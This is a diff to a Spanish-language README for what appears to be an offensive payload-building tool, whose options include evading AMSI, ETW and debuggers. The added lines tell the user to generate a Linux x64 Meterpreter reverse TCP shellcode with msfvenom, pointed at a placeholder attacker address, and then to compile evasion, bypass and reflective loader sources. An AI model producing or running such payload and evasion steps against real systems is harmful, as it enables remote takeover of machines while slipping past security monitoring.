@@ -77,6 +77,9 @@ python3 nextgen.py
 8. Usa [8] si quieres evitar AMSI, ETW y debuggers
 
 ## Recomendaciones
+Antes de cifrar el payload tienes que crearlo:
+
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=TUIP LPORT=tupuerto -f raw -o data/shellcode/payload.bin
 
 Añade evasion.c, bypass.c, reflective_loader.c en la compilación:
 
